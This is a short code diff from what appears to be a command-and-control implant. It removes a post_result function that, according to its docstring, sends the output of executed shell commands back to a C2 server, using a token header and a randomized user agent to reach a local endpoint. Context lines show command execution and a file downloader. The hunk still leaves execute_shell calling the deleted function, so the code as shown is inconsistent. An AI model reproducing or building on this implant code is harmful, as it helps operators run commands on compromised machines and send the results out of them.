@@ -183,17 +183,6 @@ def execute_shell(command, task_uuid):
         post_result(e.output.decode(), task_uuid)
 
 
-def post_result(output, task_uuid):
-    """
-    Sends task output back to C2 server
-    """
-    import json, requests
-    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
-    data = json.dumps({"uuid": task_uuid, "output": output})
-    # Replace with your encryption if used
-
-    requests.post("http://localhost:5000/result", json={"data": data},headers=headers)
-
 def download_file(url, save_as=None, task_uuid=None):
     try:
         print(f"[+] Downloading {url}")
